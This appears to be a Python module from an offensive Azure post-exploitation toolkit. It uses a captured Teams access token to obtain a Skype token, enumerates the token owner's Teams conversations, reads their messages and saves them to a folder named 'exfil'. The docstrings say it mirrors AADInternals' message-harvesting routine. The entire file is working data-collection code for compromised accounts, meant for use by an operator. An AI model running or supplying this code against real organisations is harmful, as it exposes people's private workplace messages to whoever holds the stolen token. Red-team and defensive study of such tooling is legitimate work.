# src/clouds/azure/modules/enumeration/teams_enumerate_messages.py

import json
import re
import time
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple

import requests
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, Confirm

from ...azure_session import AzureSessionManager

console = Console()

AUTHZ_ENDPOINT = "https://teams.microsoft.com/api/authsvc/v1.0/authz"


def enumerate_teams_messages(session_mgr: AzureSessionManager) -> None:
    """
    Enumerate Teams conversations and messages using the Teams native API.

    Replicates AADInternals' Get-AADIntTeamsMessages flow:
    1. Use teams_access_token (from get_teams_token command)
    2. POST to authsvc/v1.0/authz to get SkypeToken + chatService URL
    3. List conversations via Teams native API
    4. Read messages from selected conversation

    Requires: teams_access_token stored in session (use get_teams_token first)
    """
    console.print("[cyan]Teams Native API - Messages Enumeration[/cyan]")
    console.print("[dim]Using AADInternals-style Teams API (api.spaces.skype.com)[/dim]\n")

    # Step 1: Get the Teams access token from session
    teams_token = _get_teams_token(session_mgr)
    if not teams_token:
        console.print("[red]No Teams API token found.[/red]")
        console.print("[yellow]Run 'get_teams_token' first to obtain a Teams API token.[/yellow]")
        return

    # Step 2: Exchange the token for a Skype token + chatService URL
    console.print("[cyan]Exchanging token for Skype token and chatService URL...[/cyan]")
    skype_token, chat_service_url = _get_skype_token_and_service(teams_token)

    if not skype_token or not chat_service_url:
        console.print("[red]Failed to obtain Skype token or chatService URL.[/red]")
        console.print("[yellow]Your Teams token may be expired. Run 'get_teams_token' again.[/yellow]")
        return

    console.print(f"[green]Got Skype token.[/green]")
    console.print(f"[dim]Chat service: {chat_service_url}[/dim]\n")

    # Step 3: List all conversations
    console.print("[cyan]Fetching conversations...[/cyan]")
    conversations = _list_conversations(teams_token, skype_token, chat_service_url)

    if not conversations:
        console.print("[yellow]No conversations found.[/yellow]")
        return

    # Filter only thread-based conversations (channel threads start with "19:")
    thread_conversations = [c for c in conversations if c.get("id", "").startswith("19:")]
    direct_conversations = [c for c in conversations if not c.get("id", "").startswith("19:")]

    console.print(f"[green]Found {len(conversations)} conversation(s):[/green]")
    console.print(f"  [cyan]{len(thread_conversations)}[/cyan] channel/thread conversations (ID starts with 19:)")
    console.print(f"  [cyan]{len(direct_conversations)}[/cyan] direct/group messages")

    # Show conversation list
    _display_conversations(conversations)

    # Ask what to enumerate
    if not Confirm.ask("\n[cyan]Read messages from a conversation?[/cyan]", default=True):
        return

    conv_id = Prompt.ask("[cyan]Enter conversation ID (or paste from table above)[/cyan]").strip()
    if not conv_id:
        return

    # Step 4: Fetch messages from the selected conversation
    console.print(f"\n[cyan]Fetching messages from conversation...[/cyan]")
    messages = _get_conversation_messages(teams_token, skype_token, chat_service_url, conv_id)

    if not messages:
        console.print("[yellow]No messages found (or insufficient permissions).[/yellow]")
        return

    # Filter to only actual messages (not system events)
    actual_messages = [
        m for m in messages
        if "Message" in m.get("messagetype", "") and m.get("contenttype") == "text"
    ]

    console.print(f"[green]Found {len(messages)} event(s), {len(actual_messages)} text message(s).[/green]")
    _display_messages(actual_messages if actual_messages else messages[:50])

    # Save option
    if Confirm.ask("\n[cyan]Save all messages to JSON?[/cyan]", default=False):
        _save_messages(messages, conv_id, session_mgr)


def _get_teams_token(session_mgr: AzureSessionManager) -> Optional[str]:
    """
    Retrieve a valid Teams API token from the session.
    Checks expiry and warns if expired.
    """
    data = session_mgr.current_session_data or {}

    access_token = data.get("teams_access_token")
    expires_at = data.get("teams_token_expires_at")

    if not access_token:
        return None

    if expires_at and time.time() > expires_at:
        expires_dt = datetime.fromtimestamp(expires_at).strftime('%Y-%m-%d %H:%M:%S')
        console.print(f"[yellow]Teams token expired at {expires_dt}. Run 'get_teams_token' again.[/yellow]")
        return None

    if expires_at:
        expires_dt = datetime.fromtimestamp(expires_at).strftime('%Y-%m-%d %H:%M:%S')
        console.print(f"[dim]Using Teams token (valid until {expires_dt})[/dim]")

    return access_token


def _get_skype_token_and_service(teams_token: str) -> Tuple[Optional[str], Optional[str]]:
    """
    Exchange the Teams access token for a Skype token and chatService URL.

    Replicates AADInternals' Get-TeamsUserSettings:
      POST https://teams.microsoft.com/api/authsvc/v1.0/authz
      Authorization: Bearer {teams_token}

    Returns:
        Tuple of (skype_token, chat_service_url) or (None, None) on failure
    """
    try:
        response = requests.post(
            AUTHZ_ENDPOINT,
            headers={
                "Authorization": f"Bearer {teams_token}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/json",
            },
            timeout=30,
        )

        if response.status_code != 200:
            console.print(f"[red]authz request failed: HTTP {response.status_code}[/red]")
            try:
                console.print(f"[dim]{response.text[:500]}[/dim]")
            except Exception:
                pass
            return None, None

        data = response.json()

        skype_token = data.get("tokens", {}).get("skypeToken")
        chat_service_url = data.get("regionGtms", {}).get("chatService")

        if not skype_token:
            console.print("[red]No skypeToken in authz response.[/red]")
            console.print(f"[dim]Response keys: {list(data.keys())}[/dim]")
            return None, None

        if not chat_service_url:
            console.print("[yellow]No chatService URL, using default.[/yellow]")
            chat_service_url = "https://chatsvcagg.teams.microsoft.com"

        return skype_token, chat_service_url

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Network error during authz: {e}[/red]")
        return None, None
    except Exception as e:
        console.print(f"[red]Error during authz: {e}[/red]")
        return None, None


def _make_teams_headers(teams_token: str, skype_token: str) -> Dict[str, str]:
    """Build the required headers for Teams native API calls."""
    return {
        "Authorization": f"Bearer {teams_token}",
        "Authentication": f"skypetoken={skype_token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
    }


def _list_conversations(
    teams_token: str,
    skype_token: str,
    chat_service_url: str
) -> List[Dict[str, Any]]:
    """
    List all conversations for the current user.

    Replicates AADInternals' first step in Get-AADIntTeamsMessages.
    """
    url = f"{chat_service_url}/v1/users/ME/conversations"
    headers = _make_teams_headers(teams_token, skype_token)

    try:
        response = requests.get(url, headers=headers, timeout=30)

        if response.status_code != 200:
            console.print(f"[red]Failed to list conversations: HTTP {response.status_code}[/red]")
            try:
                console.print(f"[dim]{response.text[:500]}[/dim]")
            except Exception:
                pass
            return []

        data = response.json()
        # Conversations are in the root list
        conversations = data if isinstance(data, list) else data.get("conversations", [])
        return conversations

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Network error listing conversations: {e}[/red]")
        return []
    except Exception as e:
        console.print(f"[red]Error listing conversations: {e}[/red]")
        return []


def _get_conversation_messages(
    teams_token: str,
    skype_token: str,
    chat_service_url: str,
    conversation_id: str
) -> List[Dict[str, Any]]:
    """
    Get messages from a specific conversation.

    Replicates AADInternals' second step in Get-AADIntTeamsMessages:
      GET {chatService}/v1/users/ME/conversations/{id}/messages?startTime=0&view=msnp24Equivalent
    """
    url = (
        f"{chat_service_url}/v1/users/ME/conversations/{conversation_id}"
        f"/messages?startTime=0&view=msnp24Equivalent"
    )
    headers = _make_teams_headers(teams_token, skype_token)

    try:
        response = requests.get(url, headers=headers, timeout=30)

        if response.status_code != 200:
            console.print(f"[red]Failed to get messages: HTTP {response.status_code}[/red]")
            try:
                console.print(f"[dim]{response.text[:500]}[/dim]")
            except Exception:
                pass
            return []

        data = response.json()
        messages = data.get("messages", [])
        return messages

    except requests.exceptions.RequestException as e:
        console.print(f"[red]Network error getting messages: {e}[/red]")
        return []
    except Exception as e:
        console.print(f"[red]Error getting messages: {e}[/red]")
        return []


def _display_conversations(conversations: List[Dict[str, Any]]) -> None:
    """Display conversations in a table."""
    table = Table(title=f"Conversations ({len(conversations)} found)")
    table.add_column("ID", style="dim", overflow="fold", max_width=60)
    table.add_column("Type", style="cyan", max_width=15)
    table.add_column("Thread Topic", style="green", overflow="fold", max_width=40)
    table.add_column("Last Message", style="yellow", max_width=18)

    for conv in conversations:
        conv_id = conv.get("id", "")
        conv_type = "Channel" if conv_id.startswith("19:") else "Direct/Group"

        # Thread topic from properties
        props = conv.get("threadProperties", {}) or {}
        topic = props.get("topic", "") or conv.get("topic", "") or ""

        # Last message time
        last_msg = conv.get("lastMessage", {}) or {}
        last_time = last_msg.get("composetime", "") or conv.get("lastUpdatedMessageId", "")
        if last_time and len(str(last_time)) > 18:
            last_time = str(last_time)[:18]

        table.add_row(conv_id, conv_type, topic, str(last_time))

    console.print(table)


def _display_messages(messages: List[Dict[str, Any]]) -> None:
    """Display messages in a table."""
    display_limit = 50
    to_display = messages[:display_limit]

    table = Table(title=f"Messages (showing {len(to_display)} of {len(messages)})")
    table.add_column("From", style="cyan", overflow="fold", max_width=25)
    table.add_column("Content", style="green", overflow="fold", max_width=70)
    table.add_column("Time", style="yellow", max_width=18)
    table.add_column("Type", style="dim", max_width=20)

    for msg in to_display:
        # Sender
        from_raw = msg.get("from", "") or ""
        # Format: "8:orgid:..." or "8:live:..." — extract display name if present
        display_name = msg.get("imdisplayname", "") or from_raw.split(":")[-1][:25]

        # Content — strip HTML
        content = msg.get("content", "") or ""
        content = re.sub(r"<[^>]+>", "", content).strip()
        content = content[:120] + "..." if len(content) > 120 else content

        # Timestamp (compose time is epoch milliseconds or ISO)
        compose_time = msg.get("composetime", "") or msg.get("originalarrivaltime", "")
        if compose_time:
            try:
                # Try parsing as epoch ms
                ts = int(compose_time) / 1000
                time_str = datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M")
            except (ValueError, TypeError):
                # Try ISO format
                try:
                    dt = datetime.fromisoformat(str(compose_time).replace("Z", "+00:00"))
                    time_str = dt.strftime("%Y-%m-%d %H:%M")
                except Exception:
                    time_str = str(compose_time)[:16]
        else:
            time_str = ""

        msg_type = msg.get("messagetype", "")

        table.add_row(display_name, content, time_str, msg_type)

    console.print(table)

    if len(messages) > display_limit:
        console.print(f"[dim]... and {len(messages) - display_limit} more message(s). Save to JSON to see all.[/dim]")


def _save_messages(
    messages: List[Dict[str, Any]],
    conversation_id: str,
    session_mgr: AzureSessionManager
) -> None:
    """Save messages to a JSON file."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_conv_id = conversation_id.replace(":", "_").replace("@", "_")[:40]
    filename = f"teams_messages_{safe_conv_id}_{timestamp}.json"

    exfil_dir = session_mgr.get_exfil_dir("teams")
    file_path = exfil_dir / filename

    try:
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(messages, f, indent=2, ensure_ascii=False)
        console.print(f"[green]Saved {len(messages)} messages to:[/green] {file_path.resolve()}")
    except Exception as e:
        console.print(f"[red]Failed to save messages: {e}[/red]")
